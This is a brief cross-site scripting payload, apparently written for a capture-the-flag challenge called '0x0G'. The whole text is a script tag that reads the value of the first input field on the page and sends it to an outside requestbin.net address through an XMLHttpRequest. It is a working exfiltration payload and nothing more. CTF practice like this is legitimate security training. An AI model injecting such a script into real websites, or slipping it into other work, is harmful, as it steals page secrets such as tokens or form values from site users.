//CTF CHALL FOR 0x0G
<script>
var flag = document.getElementsByTagName("input")[0].getAttribute("value");
xhttp = new XMLHttpRequest();xhttp.open("GET", "http://requestbin.net/r/1kb3pvc1?flag=" + flag, false);
xhttp.send();
</script>
